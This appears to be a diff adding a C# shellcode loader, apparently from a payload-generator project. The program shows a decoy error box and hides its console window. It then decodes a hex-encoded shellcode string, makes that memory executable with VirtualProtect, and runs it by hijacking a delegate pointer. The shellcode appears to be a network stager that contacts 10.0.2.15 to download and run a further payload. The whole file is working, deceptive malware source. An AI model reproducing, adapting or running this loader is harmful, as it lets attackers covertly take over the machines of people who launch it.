@@ -1,0 +1,39 @@
+using System;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+namespace zirikatu
+{ class Program
+{ [DllImport("kernel32.dll", SetLastError = true)]
+static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+public delegate uint Ret1ArgDelegate(uint address);
+static uint PlaceHolder1(uint arg1) { return 0; }
+[DllImport("kernel32.dll")]
+static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")]
+static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+const int SW_HIDE = 0;
+unsafe static void Main(string[] args)
+{ MessageBox.Show("test", "error",MessageBoxButtons.OK,MessageBoxIcon.Error);
+var handle = GetConsoleWindow();
+ShowWindow(handle, SW_HIDE);
+string HexadezimalKatea ="fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d686e6574006877696e6954684c772607ffd531db5353535353683a5679a7ffd553536a03535368901f0000e89c0000002f617636772d394c7537386f6d7479653265715f515941616b6b62746a4b00506857899fc6ffd589c653680002608453535357535668eb552e3bffd5966a0a5f5353535356682d06187bffd585c0751668881300006844f035e0ffd54f75e168f0b5a256ffd56a4068001000006800004000536858a453e5ffd593535389e7576800200000535668129689e2ffd585c074cd8b0701c385c075e558c35fe87dffffff31302e302e322e313500";byte[] shellKodeahex = HexStringToByteArray(HexadezimalKatea);
+burutu(shellKodeahex); }
+public static byte[] HexStringToByteArray(String hexString)
+{ byte[] retval = new byte[hexString.Length / 2];
+for (int i = 0; i < hexString.Length; i += 2)
+retval [i / 2] = Convert.ToByte (hexString.Substring (i, 2), 16);
+return retval; }
+unsafe public static void burutu(byte[] asmBytes)
+{ fixed (byte* startAddress = &asmBytes[0])
+{ Type delType = typeof(Delegate);
+FieldInfo _methodPtr = delType.GetField("_methodPtr", BindingFlags.NonPublic | BindingFlags.Instance);
+Ret1ArgDelegate del = new Ret1ArgDelegate(PlaceHolder1);
+_methodPtr.SetValue(del, (IntPtr) startAddress);
+uint outOldProtection;
+VirtualProtect((IntPtr) startAddress, (uint) asmBytes.Length, 0x40, out outOldProtection);
+uint n = (uint)0x00000001;
+n = del(n);
+Console.WriteLine("{0:x}", n);
+Console.ReadKey();
+}}}}
